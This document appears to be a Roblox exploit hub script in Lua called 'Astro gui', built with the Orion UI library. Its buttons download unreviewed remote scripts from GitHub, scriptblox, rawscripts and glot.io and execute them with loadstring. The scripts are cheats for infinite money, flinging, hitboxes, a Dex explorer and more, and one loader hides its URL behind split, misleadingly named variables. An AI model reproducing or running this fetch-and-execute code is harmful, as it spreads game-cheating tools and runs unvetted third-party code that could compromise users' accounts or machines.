local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Astro gui", HidePremium = false, IntroText = "Astro's Gui", SaveConfig = true, ConfigFolder = "Astro gui"})

OrionLib:MakeNotification({
	Name = "Hey,welcome hru?",
	Content = "Some scripts might be patched!",
	Image = "rbxassetid://4483345998",
	Time = 5
})

-- Tab 1
local TutTab = Window:MakeTab({
	Name = "Tab 1",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = TutTab:AddSection({
	Name = "Admin Section"
})

TutTab:AddButton({
	Name = "Button!",
	Callback = function()
      		print("Executing!")
  	end    
})

TutTab:AddToggle({
	Name = "This is a toggle!",
	Default = false,
	Callback = function(Value)
		print("How are you!")
	end    
})

TutTab:AddColorpicker({
	Name = "Colorpicker",
	Default = Color3.fromRGB(255, 0, 0),
	Callback = function(Value)
		print(Value)
	end	  
})

TutTab:AddSlider({
	Name = "Slider",
	Min = 0,
	Max = 20,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "bananas",
	Callback = function(Value)
		print(Value)
	end    
})

-- Additional Tab (Tab 2)
local ExtraTab = Window:MakeTab({
	Name = "Games",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local ExtraSection = ExtraTab:AddSection({
	Name = "Games"
})

ExtraTab:AddButton({
	Name = "Dont get eliminated (infinite money)!",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/ELIMINATED"))()
  	end    
})

ExtraTab:AddButton({
	Name = "Fling things and people!",
	Callback = function()
      		loadstring(game:HttpGet("https://scriptblox.com/raw/Fling-Things-and-People-FTAP-Verbal-Hub-16541"))()
      end
})

ExtraTab:AddButton({
	Name = "Dress to impress!",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua",true))()
  	end    
})

ExtraTab:AddButton({
	Name = "Aura Craft!",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/Aura-Craft-V.1/main/Op%20script"))()
  	end    
})

ExtraTab:AddButton({
	Name = "adopt me (Halloween)!",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/AdoptMeHALLOWEEN"))()
  	end   
 })
 
 ExtraTab:AddButton({
	Name = "Flee the facility!",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/antisocialb2/SPIMINE-FLEETHEFACILITY/main/script.lua'))()
  	end   
 })
 
 ExtraTab:AddButton({
	Name = "Strongest battleground",
	Callback = function()
      		--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/TSBUtils.lua"))()
  	end   
 })
 
 ExtraTab:AddButton({
	Name = "evade!",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
  	end    
})

ExtraTab:AddToggle({
	Name = "Idk",
	Default = true,
	Callback = function(Value)
		print("Toggle state:", Value)
	end    
})

-- Additional Tab (Tab 2)
local ExtraTab = Window:MakeTab({
	Name = "Universal",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

ExtraTab:AddButton({
	Name = "telekenesis",
	Callback = function()
      		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua"))()
  	end    
})

ExtraTab:AddButton({
	Name = "Dex explorer",
	Callback = function()
      		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dark-Dex-Explorer-19291"))()
  	end    
})

ExtraTab:AddButton({
	Name = "Rochips",
	Callback = function()
      		if "you wanna use rochips universal" then
    local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
    local im,lonely,z_c=task.wait,game,loadstring
    z_c(lonely:HttpGet(z_z..""..z_x))()
    return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
end
  	end    
})

ExtraTab:AddButton({
	Name = "Hitbox",
	Callback = function()
      		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Update-script-hitbox-9326"))()
  	end    
})

ExtraTab:AddButton({
	Name = "Solara hub keyless!",
	Callback = function()
      		--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- Come to my discord server: https://discord.gg/samuraa1community
loadstring(game:HttpGet("https://raw.githubusercontent.com/samuraa1/Solara-Hub/refs/heads/main/Solara%20Hub.lua"))()
  	end   
 })

-- Initialize Orion Library
OrionLib:Init()
